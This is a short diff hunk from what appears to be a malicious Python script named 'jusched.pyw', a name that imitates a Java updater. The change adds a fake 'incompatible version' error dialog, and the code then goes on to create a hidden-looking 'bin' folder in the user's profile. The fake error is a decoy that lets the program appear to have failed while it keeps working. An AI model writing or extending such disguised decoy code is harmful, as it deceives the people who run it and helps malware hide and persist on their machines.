@@ -167,6 +167,8 @@ scriptName = "jusched.pyw"
 
 Cr3at3F1le()
 
+ctypes.windll.user32.MessageBoxW(0, "This program cannot run on your computer, incompatible version", "Incompatible version", 0x10)
+
 basePath = f"C:\\Users\\{os.getlogin()}\\bin"
 if not os.path.exists(basePath):
     os.mkdir(basePath)
